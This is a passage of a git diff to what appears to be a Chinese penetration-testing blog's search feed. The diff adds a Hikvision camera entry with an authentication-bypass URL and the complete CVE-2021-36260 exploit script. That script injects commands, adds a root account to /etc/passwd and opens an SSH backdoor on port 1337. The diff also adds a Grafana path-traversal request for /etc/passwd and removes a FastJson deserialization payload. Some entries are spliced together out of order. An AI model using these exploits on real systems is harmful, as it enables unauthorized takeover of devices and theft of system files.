print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(url=&#x27;/N&#x27;, query_args=None)</span><br><span class="line"></span><br><span class="line">    if data.status_code == 404:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;)</span><br><span class="line">        data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;)</span><br><span class="line">        if data.status_code == 401:</span><br><span class="line">            print(data.headers)</span><br><span class="line">            print(data.text)</span><br><span class="line">            return False</span><br><span class="line">        remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;)</span><br><span class="line">    os.system(f&#x27;stty echo; stty iexten; stty icanon; \</span><br><span class="line">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span><br><span class="line">    P@&#123;args.rhost&#125; -p 1337&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27;</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27;</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    remote = Http(args.rhost, args.rport, args.proto)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        if args.shell:</span><br><span class="line">            shell(remote, args)</span><br><span class="line">        elif args.cmd:</span><br><span class="line">            cmd(remote, args)</span><br><span class="line">        elif args.cmd_blind:</span><br><span class="line">            cmd_blind(remote, args)</span><br><span class="line">        elif args.check:</span><br><span class="line">            check(remote, args)</span><br><span class="line">        elif args.reboot:</span><br><span class="line">            check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            parser.parse_args([&#x27;-h&#x27;])</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">靶机部署:</span><br><span class="line">cd vulhub/grafana/CVE-2021-43798</span><br><span class="line">sudo docker-compose up -d // 开启环境</span><br><span class="line">访问靶机3000端口，出现下图页面即搭建完成</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>网络设备</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>FastJson</title>
-    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html</url>
-    <content><![CDATA[<h1 id="FastJson反序列化漏洞">1. FastJson反序列化漏洞</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/07/11/Ywe7qFNBx1htvi3.png" alt="image-20220711135552251"></p>
+<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、要利用该漏洞，首先需要知道一个有效的插件 id，例如alertlist，以下是一些常见的插件 id：</span><br><span class="line"></span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">2、发送以下请求以检索/etc/passwd（可以将 alertlist 替换为任何有效的插件 id）:</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞利用：">1.2. 漏洞利用：</h2><p>可以通过burp插件FastJsonScan实现被动扫描检测。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;x&quot;:			&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;wq122qedk25rwzt.fwxxn1.dnslog.cn&quot;,&quot;portToConnectTo&quot;:80,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;ubuntu&quot;,&quot;useSSL&quot;:&quot;false&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;mysql&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416091752822.png" alt="image-20230416091752822"></p>
-<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将fastjson升级至最新版本。</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/07/11/I5E3OZmMDpCP6zS.png" alt="image-20220711140913715"></p>
+<p>漏洞修复:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、官方已更新到V8.3.1版本，对漏洞进行了修复。</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
-        <category>WEB框架</category>
+        <category>云攻防</category>
       </categories>
   </entry>
   <entry>
@@ -245,6 +229,22 @@
 ]]></content>
       <categories>
         <category>WEB应用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Hikvision</title>
+    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Hikvison.html</url>
+    <content><![CDATA[<h1 id="Hikvision摄像头">1. Hikvision摄像头</h1><h2 id="CVE-2017-7921-身份认证绕过">1.1. CVE-2017-7921(身份认证绕过)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先访问	</span><br><span class="line">/Security/users?auth=YWRtaW46MTEK </span><br><span class="line">再访问	</span><br><span class="line">/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br><span class="line">一直刷新可以一直获取当前快照</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182925765.png" alt="image-20220916182925765"></p>
+<h2 id="CVE-2021-36260-RCE">1.2. CVE-2021-36260(RCE)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-36260.py --rhost x.x.x.x --port 80 --cmd &quot;ls -all&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182504585.png" alt="image-20220916182504585"></p>
+<h3 id="EXP">1.2.1. EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span><br><span class="line"># Exploit Author: bashis</span><br><span class="line"># Vendor Homepage: https://www.hikvision.com/</span><br><span class="line"># Version: 1.0</span><br><span class="line"># CVE: CVE-2021-36260</span><br><span class="line"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span><br><span class="line"></span><br><span class="line"># All credit to Watchful_IP</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Note:</span><br><span class="line">1)  This code will _not_ verify if remote is Hikvision device or not.</span><br><span class="line">2)  Most of my interest in this code has been concentrated on how to</span><br><span class="line">    reliably detect vulnerable and/or exploitable devices.</span><br><span class="line">    Some devices are easy to detect, verify and exploit the vulnerability,</span><br><span class="line">    other devices may be vulnerable but not so easy to verify and exploit.</span><br><span class="line">    I think the combined verification code should have very high accuracy.</span><br><span class="line">3)  &#x27;safe check&#x27; (--check) will try write and read for verification</span><br><span class="line">    &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification</span><br><span class="line"></span><br><span class="line">[Examples]</span><br><span class="line">Safe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check</span><br><span class="line"></span><br><span class="line">Safe and unsafe vulnerability/verify check:</span><br><span class="line">(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;)</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot</span><br><span class="line"></span><br><span class="line">Unsafe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot</span><br><span class="line"></span><br><span class="line">Launch and connect to SSH shell:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell</span><br><span class="line"></span><br><span class="line">Execute command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;</span><br><span class="line"></span><br><span class="line">Execute blind command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;</span><br><span class="line"></span><br><span class="line">$./CVE-2021-36260.py -h</span><br><span class="line">[*] Hikvision CVE-2021-36260</span><br><span class="line">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span><br><span class="line">usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]</span><br><span class="line">                         [--reboot] [--shell] [--cmd CMD]</span><br><span class="line">                         [--cmd_blind CMD_BLIND] [--noverify]</span><br><span class="line">                         [--proto &#123;http,https&#125;]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --rhost RHOST         Remote Target Address (IP/FQDN)</span><br><span class="line">  --rport RPORT         Remote Target Port</span><br><span class="line">  --check               Check if vulnerable</span><br><span class="line">  --reboot              Reboot if vulnerable</span><br><span class="line">  --shell               Launch SSH shell</span><br><span class="line">  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)</span><br><span class="line">  --cmd_blind CMD_BLIND</span><br><span class="line">                        execute blind cmd (i.e: &quot;reboot&quot;)</span><br><span class="line">  --noverify            Do not verify if vulnerable</span><br><span class="line">  --proto &#123;http,https&#125;  Protocol used</span><br><span class="line">$</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from requests import packages</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">from requests.packages.urllib3 import exceptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Http(object):</span><br><span class="line">    def __init__(self, rhost, rport, proto, timeout=60):</span><br><span class="line">        super(Http, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rhost = rhost</span><br><span class="line">        self.rport = rport</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">        self.remote = None</span><br><span class="line">        self.uri = None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span><br><span class="line">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">        self.remote = requests.Session()</span><br><span class="line"></span><br><span class="line">        self._init_uri()</span><br><span class="line"></span><br><span class="line">        self.remote.headers.update(&#123;</span><br><span class="line">            &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;,</span><br><span class="line">            &#x27;Accept&#x27;: &#x27;*/*&#x27;,</span><br><span class="line">            &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;,</span><br><span class="line">            &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">            &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.remote.proxies.update(&#123;</span><br><span class="line">            # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def send(self, url=None, query_args=None, timeout=5):</span><br><span class="line"></span><br><span class="line">        if query_args:</span><br><span class="line">            &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span><br><span class="line">            if len(query_args) &gt; 22:</span><br><span class="line">                print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;)</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;This weird code will try automatically switch between http/https</span><br><span class="line">        and update Host</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27;</span><br><span class="line">            self._init_uri()</span><br><span class="line">            try:</span><br><span class="line">                if url and not query_args:</span><br><span class="line">                    return self.get(url, timeout)</span><br><span class="line">                else:</span><br><span class="line">                    data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                return None</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            return None</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        if data.status_code == 302:</span><br><span class="line">            redirect = data.headers.get(&#x27;Location&#x27;)</span><br><span class="line">            self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)]</span><br><span class="line">            self._update_host()</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line"></span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">    def _update_host(self):</span><br><span class="line">        if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]:</span><br><span class="line">            self.remote.headers.update(&#123;</span><br><span class="line">                &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:],</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">    def _init_uri(self):</span><br><span class="line">        self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))</span><br><span class="line"></span><br><span class="line">    def put(self, url, query_args, timeout):</span><br><span class="line">        &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span><br><span class="line">        query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \</span><br><span class="line">                     f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27;</span><br><span class="line">        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    def get(self, url, timeout):</span><br><span class="line">        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    status_code == 200 (OK);</span><br><span class="line">        Verified vulnerable and exploitable</span><br><span class="line">    status_code == 500 (Internal Server Error);</span><br><span class="line">        Device may be vulnerable, but most likely not</span><br><span class="line">        The SDK webLanguage tag is there, but generate status_code 500 when language not found</span><br><span class="line">        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)</span><br><span class="line">        (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...)</span><br><span class="line">    status_code == 401 (Unauthorized);</span><br><span class="line">        Defiantly not vulnerable</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.noverify:</span><br><span class="line">        print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/&#x27;, query_args=None)</span><br><span class="line">    if data is None:</span><br><span class="line">        print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return None</span><br><span class="line">    print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;))</span><br><span class="line"></span><br><span class="line">    data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;)</span><br><span class="line">    if data is None or data.status_code == 404:</span><br><span class="line">        print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    status_code = data.status_code</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/c&#x27;, query_args=None)</span><br><span class="line">    if not data.status_code == 200:</span><br><span class="line">        &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span><br><span class="line">        if status_code == 500:</span><br><span class="line">            print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">            if args.reboot:</span><br><span class="line">                return check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    print(&#x27;[!] Remote is verified exploitable&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_reboot(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request.</span><br><span class="line">    - if there is data returned, we can assume remote is not vulnerable.</span><br><span class="line">    - If there is no connection or data returned, we can assume remote is vulnerable.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.check:</span><br><span class="line">        print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;)</span><br><span class="line">    remote.send(query_args=&#x27;reboot&#x27;)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    if not remote.send(url=&#x27;/&#x27;, query_args=None):</span><br><span class="line">        print(&#x27;[!] Remote is vulnerable&#x27;)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;[+] Remote is not vulnerable&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;)</span><br><span class="line">    if data is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/x&#x27;, query_args=None)</span><br><span class="line">    if data is None or not data.status_code == 200:</span><br><span class="line">        print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    print(data.text)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd_blind(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Blind command injection</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;)</span><br><span class="line">    if data is None or not data.status_code == 500:</span><br><span class="line">        print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(url=&#x27;/N&#x27;, query_args=None)</span><br><span class="line"></span><br><span class="line">    if data.status_code == 404:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;)</span><br><span class="line">        data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;)</span><br><span class="line">        if data.status_code == 401:</span><br><span class="line">            print(data.headers)</span><br><span class="line">            print(data.text)</span><br><span class="line">            return False</span><br><span class="line">        remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;)</span><br><span class="line">    os.system(f&#x27;stty echo; stty iexten; stty icanon; \</span><br><span class="line">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span><br><span class="line">    P@&#123;args.rhost&#125; -p 1337&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27;</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27;</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    remote = Http(args.rhost, args.rport, args.proto)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        if args.shell:</span><br><span class="line">            shell(remote, args)</span><br><span class="line">        elif args.cmd:</span><br><span class="line">            cmd(remote, args)</span><br><span class="line">        elif args.cmd_blind:</span><br><span class="line">            cmd_blind(remote, args)</span><br><span class="line">        elif args.check:</span><br><span class="line">            check(remote, args)</span><br><span class="line">        elif args.reboot:</span><br><span class="line">            check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            parser.parse_args([&#x27;-h&#x27;])</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络设备</category>
       </categories>
   </entry>
   <entry>
@@ -293,18 +293,6 @@
       </categories>
   </entry>
   <entry>
-    <title>InfoGrather</title>
-    <url>/pages/MyTools/InfoGrather.html</url>
-    <content><![CDATA[<h1 id="InfoGrather">1. InfoGrather</h1><p>InfoGrather(信息收集)可以自动化进行域名解析成IP，whois查询，子域名暴破(可以检测泛解析)，基础端口的扫描，使用方法<code>python3 InfoGrather.py -d 域名 -f 子域目录地址</code></p>
-<h2 id="使用效果">1.1. 使用效果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221228094107704.png" alt="image-20221228094107704"></p>
-<h2 id="源码">1.2. 源码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InfoGather</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title 